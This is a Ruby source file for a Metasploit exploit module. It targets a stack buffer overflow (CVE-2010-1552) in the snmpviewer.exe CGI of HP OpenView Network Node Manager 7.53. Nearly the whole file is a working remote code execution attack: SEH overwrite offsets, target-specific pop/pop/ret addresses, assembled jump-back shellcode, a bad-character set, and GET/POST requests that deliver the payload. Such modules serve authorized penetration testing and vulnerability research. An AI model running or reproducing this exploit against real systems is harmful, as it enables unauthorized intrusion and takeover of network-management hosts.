##
# $Id: hp_nnm_snmpviewer_actapp.rb 12098 2011-03-23 15:47:20Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/snmpviewer.exe', :pattern => /Hewlett-Packard Development Company/ }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
				prior to NNM_01203. By making a specially crafted HTTP request to the "snmpviewer.exe"
				CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary
				code.

				The vulnerable code lies within the a function within "snmpviewer.exe" with a
				timestamp prior to April 7th, 2010. This vulnerability is triggerable via either a GET
				or POST request. The request must contain 'act' and 'app' parameters which, when
				combined, total more than the 1024 byte stack buffer can hold.

				It is important to note that this vulnerability must be exploited by overwriting SEH.
				While the saved return address can be smashed, a function call that occurs before
				the function returns calls "exit".
			} ,
			'Author'         =>
				[
					'jduck'   # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 12098 $',
			'References'     =>
				[
					[ 'CVE', '2010-1552' ],
					[ 'OSVDB', '64975' ],
					[ 'BID', '40068' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-083/' ],
					[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02153379' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024, # 1024 byte buffer..
					'BadChars' =>
						# Not sure why this one has a different set of bad chars...
						(
							(0x00..0x08).to_a + (0x0b..0x1f).to_a +
							[ 0x21, 0x26, 0x3c, 0x3e, 0x5b, 0x5d, 0x5e, 0x60, 0x7e, 0x7f ]
						).pack('C*'),
					'DisableNops' => true,
					# Manually use FPU to get EIP into ECX
					'PrependEncoder' => "\x89\xe2\xdb\xdb\xd9\x72\xf4\x59\x83\xe9\xf7",
					'EncoderOptions' => { 'BufferRegister' => 'ecx' },
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'HP OpenView Network Node Manager 7.53 w/NNM_01201',
						{
							'Ret'     => 0x5a238ba7, # pop edx/pop ebp/ret - in ovsnmp.dll v1.30.10.9166
						}
					],
					[ 'HP OpenView Network Node Manager 7.53 (Windows 2003)',
						{
							'Ret'     => 0x71c069dd, # pop edx/pop ecx/ret - in ws2_32.dll v5.2.3790.3959
						}
					],
					[ 'Debug Target',
						{
							'Ret'     => 0xdeadbeef, # crasher
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'May 11 2010'))

		register_options(
			[
				Opt::RPORT(80),
			], self.class)
	end

	def exploit

		print_status("Trying target #{target.name}...")

		cgi = '/OvCgi/snmpviewer.exe'

		# "ins" must be "load" or "content"
		ins_ok = [ 'load', 'content' ]
		ins = ins_ok[rand(ins_ok.length)]

		start = 'The specified Application/Action name is not defined.<p>Application:"'
		#middle = '"<p>Action:"'

		ia32 = Metasm::Ia32.new

		# SEH
		seh_offset = 1192
		seh_frame = rand_text(8)

		# Jump back to the payload, after p/p/r jumps to us.
		distance = seh_offset - start.length + seh_frame.length # dry run
		jmp_back = Metasm::Shellcode.assemble(ia32, "jmp $-" + distance.to_s).encode_string
		distance = seh_offset - start.length - jmp_back.length
		distance += 8 if ins == 'content'
		jmp_back = Metasm::Shellcode.assemble(ia32, "jmp $-" + distance.to_s).encode_string

		# A short jump back to the long jump back :)
		jmp_small = Metasm::Shellcode.assemble(ia32, "jmp $-" + jmp_back.length.to_s).encode_string

		# Fix up the SEH frame
		seh_frame[0,jmp_small.length] = jmp_small
		seh_frame[4,4] = [target.ret].pack('V')

		# Create the buffer
		buf = ''
		buf << payload.encoded
		pad = seh_offset - start.length - buf.length - jmp_back.length
		pad += 8 if ins == 'content'
		buf << rand_text(pad)
		buf << jmp_back
		buf << seh_frame

		app = buf

		# Force an exception writing off the end of the stack
		action = rand_text(1024)

		# Send the request
		if rand(2) > 0
			print_status("Sending exploit via POST request (ins=#{ins})...")
			res = send_request_cgi({
				'uri'		  => cgi,
				'method'	  => "POST",
				'vars_post' =>
					{
						'ins' => ins,
						'act' => action,
						'app' => app
					}
			}, 3)
		else
			print_status("Sending exploit via GET request (ins=#{ins})...")
			res = send_request_cgi({
				'uri'		  => cgi,
				'method'	  => "GET",
				'vars_get' =>
					{
						'ins' => ins,
						'act' => action,
						'app' => app
					}
			}, 3)
		end

		if res and res.code != 502
			print_error("Eek! We weren't expecting a response, but we got one")
			print_status(res.inspect) if datastore['NNM_DEBUG']
		end

		handler

	end

	def wfs_delay
		5
	end

end

